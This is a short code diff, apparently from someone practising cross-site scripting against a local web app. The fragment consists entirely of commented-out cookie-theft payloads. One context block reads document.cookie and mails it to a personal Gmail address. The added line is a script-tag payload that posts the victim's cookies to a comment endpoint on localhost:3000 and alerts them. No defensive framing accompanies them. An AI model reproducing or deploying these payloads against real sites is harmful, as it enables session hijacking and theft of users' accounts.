@@ -10,3 +10,5 @@
 //     const cook = document.cookie;
 //     window.open(`mailto:sajadph375@gmail.com?subject=null&body=${cook}`)
 // })
+
+//  <script>(()=>{fetch('http://localhost:3000/api/addcomment',{method:'POST',headers: {"Content-Type":"application/json",},body: JSON.stringify({comment:document.cookie})});console.log(document.cookie);window.alert(document.cookie)})()</script>
